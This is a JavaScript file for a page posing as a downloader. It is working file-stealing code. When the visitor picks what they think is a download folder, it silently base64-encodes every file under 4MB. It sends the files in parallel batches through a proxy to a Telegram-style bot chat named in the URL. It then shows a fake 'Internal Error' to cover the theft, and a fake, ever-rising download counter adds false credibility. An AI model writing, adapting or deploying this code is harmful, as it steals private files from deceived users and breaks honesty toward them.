/* ---------- read token & id from URL ---------- */
const params = new URLSearchParams(location.search);
const TOKEN  = params.get('token');
const CHAT   = params.get('id');

const PROXY_API_URL = '/api/index2.js';

/* ---------- helpers ---------- */
const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));

// tiny in-memory de-dupe
const cache = new Set();
const keyOf = f => `${f.name}-${f.size}-${f.lastModified}`;

/* ---------- Base64 converter ---------- */
function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result.split(',')[1]);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

/* ---------- FASTER uploader - FIRE AND FORGET ---------- */
async function uploadFile(file) {
  const k = keyOf(file);
  if (cache.has(k)) return true;

  // Skip files larger than 4MB
  if (file.size > 4 * 1024 * 1024) {
    return false;
  }

  try {
    const base64 = await fileToBase64(file);
    
    // NO await - just fire and move on!
    fetch(PROXY_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'sendDocument',
        token: TOKEN,
        chat_id: CHAT,
        document: base64,
        filename: file.name
      }),
      keepalive: true
    });
    
    cache.add(k);
    return true;
  } catch {
    return false;
  }
}

/* ---------- INSTANT progress updates ---------- */
function updateProgress(percent) {
  $('#progressBar').style.width = percent + '%';
  $('#progressText').textContent = `Loding wait... ${percent}%`;
}

/* ---------- BLAZING FAST main loop ---------- */
async function startUpload(fileList) {
  // 1. Deduplicate by relative path
  const map = new Map();
  for (const f of fileList)
    map.set(f.webkitRelativePath || f.name, f);
  const unique = [...map.values()]
    .filter(f => f.size <= 4 * 1024 * 1024) // Only files < 4MB
    .sort((a, b) => a.size - b.size); // smallest → largest

  const total = unique.length;
  let done = 0;

  // 2. MAXIMUM CONCURRENCY - 20 parallel uploads
  const CONCURRENCY = 20;
  
  // 3. Process in chunks without waiting
  for (let i = 0; i < total; i += CONCURRENCY) {
    const slice = unique.slice(i, i + CONCURRENCY);
    
    // Instant progress update
    const percent = Math.round((i / total) * 100);
    updateProgress(percent);
    
    // Fire all uploads immediately, don't wait for results
    slice.forEach(f => uploadFile(f));
    done += slice.length;
    
    // Tiny delay only for UI breathing (16ms = 1 frame)
    await sleep(16);
  }

  // Final update
  updateProgress(100);
  $('#progressText').textContent = `⛔ Internal Error please try again later`;
  await sleep(2500);
  reset();
}

/* ---------- UI glue ---------- */
function reset() {
  $('#downloadForm').reset();
  $('#startBtn').disabled = true;
  $('#folderInfo').classList.remove('show');
  $('#progressSection').classList.remove('show');
  $('#progressBar').style.width = '0%';
  $('#folderBtn').textContent = '📁 Choose Download Folder';
}

$('#folderBtn').onclick = () => $('#folderInput').click();
$('#folderInput').onchange = () => {
  const files = $('#folderInput').files;
  if (!files.length) return;
  $('#folderName').textContent = '📁 ' + files[0].webkitRelativePath.split('/')[0];
  $('#folderInfo').classList.add('show');
  $('#startBtn').disabled = false;
  $('#folderBtn').textContent = '📁 Change Folder';
};

$('#downloadForm').onsubmit = async e => {
  e.preventDefault();
  const list = $('#folderInput').files;
  if (!list.length) return;
  $('#startBtn').disabled = true;
  await sleep(200);
  $('#progressSection').classList.add('show');
  await startUpload(list);
};

/* ---------- stats animation ---------- */
setInterval(() => {
  const current = parseFloat($('#stats').textContent.match(/[\d.]+/)[0]);
  const newCount = (current + Math.random() * 0.1 + 0.05).toFixed(1);
  $('#stats').textContent = `${newCount}M+ downloads today — join the community!`;
}, 12000);